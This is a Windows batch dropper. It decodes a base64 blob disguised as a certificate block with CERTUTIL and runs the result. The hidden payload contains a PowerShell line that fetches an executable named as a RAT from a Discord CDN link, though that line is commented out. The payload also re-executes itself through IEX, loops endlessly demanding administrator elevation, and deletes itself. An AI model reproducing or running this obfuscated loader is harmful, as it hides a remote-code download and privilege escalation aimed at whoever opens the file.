@echo off
CERTUTIL -f -decode "%~f0" "%Temp%/test.bat" >nul 2>&1 
cls
"%Temp%/test.bat"
Exit
-----BEGIN CERTIFICATE-----
PCMgOmJhdGNoIHNjcmlwdApAZWNobyBvZmYKI1Bvd2VyU2hlbGwgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLW5vcHJvZmlsZSAtd2luZG93c3R5bGUgaGlkZGVuIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwOTkyOTc0NTM2ODcxOTM2MDAvMTEzNjgwODE3MjY0NDk5NTEyMi9yYXQtc2Nhbl92X2JldGEuZXhlJywnJVRFTVAlXFVwbG9hZFRoaXNGaWxlLmV4ZScpCnNldGxvY2FsCiPYp9mG2LTYp9ihINmF2YTZgSDYqNin2Kog2KjYo9mF2LEg2YTYqti02LrZitmEINmF2YTZgSDYp9mE2KjYp9iqINin2YTYqtin2YTZiiDZhdiu2YHZigplY2hvIHN0YXJ0IC9taW4gY21kIC9jICIldGVtcCVcQmF0Y2hCeWxvYWQuYmF0IiA+PiAlVGVtcCVcQmF0Y2hCeWxvYWRTdGFydEhpZC5iYXQKY2QgIiV+ZHAwIgpwb3dlcnNoZWxsIC1lcCByZW1vdGVzaWduZWQgLUNvbW1hbmQgIklFWCAkKFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxUZXh0KCclfmYwJykpIgplbmRsb2NhbApkZWwgJTAKZXhpdApnb3RvOmVvZgojPgp3aGlsZSgkdHJ1ZSl7dHJ5e1N0YXJ0LVByb2Nlc3MgJ2NtZCcgLVZlcmIgcnVuYXMgLUFyZ3VtZW50TGlzdCAnL2sgJVRFTVAlXEJhdGNoQnlsb2FkU3RhcnRIaWQuYmF0IC8nO2V4aXR9Y2F0Y2h7fX0KZGVsICUwCkRlbCAlfjA=
-----END CERTIFICATE-----